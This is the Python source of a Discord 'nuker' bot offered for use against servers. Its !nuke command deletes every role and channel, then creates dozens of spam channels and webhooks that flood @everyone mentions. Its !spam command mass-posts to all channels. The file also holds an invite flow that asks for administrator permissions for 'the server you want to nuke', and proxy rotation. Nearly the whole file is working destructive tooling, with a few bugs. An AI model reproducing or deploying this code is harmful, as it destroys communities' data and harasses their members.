# Thanks Soheab for the embed color help, and DSample for the ASCII Art Diagrams!
# >> https://gist.github.com/Soheab/d9cf3f40e34037cfa544f464fc7d919e  << Embed colors
# >> https://gist.github.com/dsample/79a97f38bf956f37a0f99ace9df367b9 << ASCII Art Diagrams

import discord
from discord import Intents
# from discord import slash_command # may use later
from discord.ext import commands, tasks
import json
import time
import random
import asyncio
from asyncio import create_task

banner = """
╔═══════════════════════════════════════════╗
║                  Credits                  ║
╠═════════════════════╦═════════════════════╣
║ Original Creator    ║ kllorefr            ║
╠═════════════════════╬═════════════════════╣
║ Kllore ID           ║ 1204119391021695018 ║
╠═════════════════════╬═════════════════════╣
║ Modifications       ║ lhwe                ║
╠═════════════════════╬═════════════════════╣
║ lhwe ID             ║ 1195403744322519080 ║
╚═════════════════════╩═════════════════════╝
"""
print(banner)

banned_users = [1, 2, 3]
clientID = 1227337223070941228
protected_servers = [123, 456]
for protected_server in protected_servers:
    print(f'Guilds {protected_servers} will not be affected')
# ▼ Commented out, but not removed, as i added customized nuke and spam messages ▼
# nuke_command_message = '@everyone @here'
# spam_command_message = '@everyone @here YOUR TEXT'
nukeStarter = "|| @everyone @here ||\n"
spamStarter = "|| @everyone @here ||\n"

# proxy logic
selected_proxy = ""
proxies = []

def getCurrentServerInfo(ctx):
    guild = str(ctx.guild)
    guildRoles = ' '.join([f'<@&{role.id}>' for role in ctx.guild.roles])
    guildName = str(ctx.guild.name)
    guildDescription = str(ctx.guild.description)
    guildOwner = str(ctx.guild.owner)
    guildID = str(ctx.guild.id)
    guildMemberCount = str(ctx.guild.member_count)
    currentExecutingChannel = str(ctx.channel)
    messageContent = str(ctx.message.content)
    
    server_info = {
        "server": guild,
        "roles": guildRoles,
        "name": guildName,
        "description": guildDescription,
        "owner": guildOwner,
        "id": guildID,
        "member_count": guildMemberCount,
        "icon": 'Coming soon:tm:',
        "channel": currentExecutingChannel,
        "content": messageContent
    }
    
    return server_info

TOKEN = "TOKEN"

intents = discord.Intents.default()
intents.dm_messages = True
intents.emojis = True
intents.typing = True
intents.presences = True
intents.message_content = True
intents.guild_messages = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command('help')

@bot.event
async def on_ready():
    print(f'Started bot ({bot.user})')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="over your mother"), status=discord.Status.idle) # changed wording, as it displayed as "Watching at your mother", and now displays as "Watching over your mother"

# added this feature from NAGPDB
@bot.event
async def on_guild_join(guild):
    invite = await ctx.guild.text_channels[0].create_invite(max_age=0, max_uses=0, unique=True)
    print(f'Joined {guild.name}! Permanent invite link: {invite.url}')

@bot.command(name="help", description = "Lists commands and usage")
async def help(ctx):
    await ctx.message.delete()
    print(f'{ctx.author} ran help in <#{ctx.channel.id}>')
    if ctx.message.content == '!help commands':
        embed = discord.Embed(
                title = "Help | Commands", 
                description = "!nuke - Deletes all text channels, voice channels, and roles(Usage: `!nuke`)\n!spam - Spams a custom message (Usage: `!spam test 5`)\n!members - Displays server member count(Usage: `!members`)", 
                color = discord.Color.blue()
                )
        getCurrentServerInfo(ctx)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title = "Help | General", 
            description = "Commands (Usage: `!help commands`)\nMore coming soon™️", 
            color = discord.Color.blue()
        )
        getCurrentServerInfo(ctx)
    await ctx.send(embed=embed)

async def killobject(obj):
    try: await obj.delete()
    except: pass

async def sendch(ctx, channel: discord.TextChannel, count):
    try:
        text = ctx.message.content.split("!spam ")[1]
        parts = text.split()
        count = int(parts[-1])
        message = ' '.join(parts[1:-1])
        for _ in range(count):
            await channel.send(nukeStarter + message)
    except Exception as exceptionError:
        embed = discord.Embed(
            title = "An unexpected error occurred", 
            description = exceptionError, 
            color = discord.Color.green()
            )
        ctx.send(embed=embed)

async def createchannel(ctx,name):
    try:
        chan = await ctx.guild.create_text_channel(name=name)
        wb = await chan.create_webhook(name="kllore. ontop")
        create_task(sendch(ctx,wb,40))
    except: pass

async def checkIfProtected(ctx):
    guildID = getCurrentServerInfo(ctx)['id']
    if guildID in protected_servers:
        embed = discord.Embed(
            title = "This server is protected.", 
            description = "This server cannot be nuked, as it is protected.", 
            color = discord.Color.green()
            )
        ctx.send(embed=embed)
        return True
    else:
        return False

@bot.command(name="nuke", description = "Nukes the current server")
async def nuke(ctx):
    server_info = getCurrentServerInfo(ctx)
    if server_info['id'] not in protected_servers:
        await ctx.message.delete()
        for role in ctx.guild.roles:
            create_task(killobject(obj=role))
        for channel in ctx.guild.channels:
            create_task(killobject(obj=channel))
        for _ in range(30):    
            create_task(createchannel(ctx, name="kllore on top"))
        time.sleep(1)
        for channel in ctx.guild.channels:
            await ctx.channel.send(f'{nukeStarter} | kllore on top :bangbang:')
        await asyncio.sleep(6)
        invite = ""
        try:
            invite = await random.choice(ctx.guild.text_channels).create_invite()
            print(f'Started nuking {ctx.guild.name} (join here: {invite})')
        except:
            pass
        embed = discord.Embed(
            title = "Nuking started 👀", 
            description = "gg 🐈 | killore. on top | lhwe was here", 
            color = discord.Color.green()
            )
        ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title = "Cannot nuke server", 
            description = "This server is protected.", 
            color = discord.Color.red()
            )
        ctx.send(embed=embed)
    await ctx.message.delete()
    await ctx.send('Starting... Please wait!')
    print(f'{ctx.author} ran a command')

@bot.command(name="spam", description = "Spams all channels with a custom message")
async def spam(ctx):
    server_info = getCurrentServerInfo(ctx)
    currentGuild = server_info['id']
    if currentGuild in protected_servers:
        embed = discord.Embed(title = "Could not spam", description = "This server is protected.", color = discord.Color.red())
        server_info = getCurrentServerInfo(ctx)
        await ctx.send(embed=embed)

    else:
        message = ctx.message.content.split("!spam ")[1]
        parts = message.split()
        count = int(parts[-1])
        message = ' '.join(parts[:-1])
        for channel in ctx.guild.text_channels:
            if channel is None:
                channel = ctx.channel
            for i in range(count):
                await channel.send(message)
    print(f'{ctx.author} ran a command')

@bot.command(name="members", description = "Get member count.")

async def members(ctx):
    server_info = getCurrentServerInfo(ctx)
    await ctx.message.delete()
    print(f'{ctx.author} ran a command')
    embed_channel = discord.Embed(
            title = f"Server Members",
            description = f"The current server, {server_info['name']}, is {server_info['member_count']} members.",
            color = discord.Color.green()
        )
    getCurrentServerInfo(ctx)
    await ctx.send(embed=embed_channel)
    print(f'{ctx.author} ran a command')

@bot.command(name="invite", description = "DM's the author the bots invite URI")

async def invite(ctx):
    embed = discord.Embed(
        title = "Bot inviter", 
        description = "DM's the user the bot's invite URI", color = discord.Color.green()
        )
    if ctx.author.id not in banned_users:
        embed_channel = discord.Embed(
            title = "Check your DM's.",
            description = "If you didn't recieve a DM from the bot, enable DM's in your privacy(or server privacy) settings.",
            color = discord.Color.green()
        )
        getCurrentServerInfo(ctx)
        await ctx.send(embed=embed_channel)
        embed_dm = discord.Embed(
            title = "Nuker bot",
            description = "To use this nuking utility, you must add the bot to the server you want to nuke.",
            color = discord.Color.blue()
        )
        embed_dm.add_field(name="invite link", value="https://discord.com/api/oauth2/authorize?bot_id={clientID}&permissions=8&scope=bot")
        embed_dm.add_field(name="commands:", value="!nuke, !spam")
        await ctx.author.send(embed=embed_dm)
    else:
        embed =discord.Embed(
            title = "Banned!",
            description = f"You(<@{ctx.author.id}>) have been banned from using this bot!",
        )
        await ctx.author.send(embed=embed)
    print(f'{ctx.author} ran a command')

try:
    with open('proxies.json', 'r') as f:
        proxies = json.load(f)
except FileNotFoundError:
    embed = discord.Embed(title = "No proxies file found.", description = "Please create the file and add proxies to continue.", color = discord.Color.red())
    ctx.send(embed=embed)
    print(f'{ctx.author} ran a command')

@tasks.loop(hours=1)

async def change_proxy():
    global selected_proxy
    if proxies:
        selected_proxy = random.choice(proxies)
    else:
        selected_proxy = ""

@bot.command(name="info", description="Displays server info")

async def info(ctx):
    server_info = getCurrentServerInfo(ctx)
    formatted_info = f'''
    Server: {server_info['server']}
    Server Roles: {server_info['roles']}
    Server Name: {server_info['name']}
    Server Description: {server_info['description']}
    Server Owner: {server_info['owner']}
    Server ID: {server_info['id']}
    Server Members: {server_info['member_count']}
    Server Icon: {server_info['icon']}
    Current channel: {server_info['channel']}
    Message content: {server_info['content']}
    '''
    await ctx.send(formatted_info)
    print(f'{ctx.author} ran command info')

@bot.command(name="proxy", description="proxys")

async def proxys(ctx, *new_proxies):
    added_proxies = []

    for new_proxy in new_proxies:
        new_proxy = new_proxy.strip()
        if new_proxy:
            proxies.append(new_proxy)
            added_proxies.append(new_proxy)

    if added_proxies:
        with open('proxies.json', 'w') as f:
            json.dump(proxies, f)
        added_proxies_str = "\n".join(added_proxies)
        embed = discord.Embed(title = "Proxies loaded", description = f"Loaded {len(added_proxies)} proxies.", color = discord.Color.green())
        getCurrentServerInfo(ctx)
        await ctx.send(embed=embed)
    elif added_proxies == [] or '':
        embed = discord.Embed(title = "No proxies loaded", description = "Make sure you put proxies in the proxies.json file.", color = discord.Color.red())
        getCurrentServerInfo(ctx)
    await ctx.send(embed=embed)
    print(f'{ctx.author} ran  proxys in <#{ctx.channel.id}>')

# I was gonna add error handling, however 

bot.run(TOKEN)
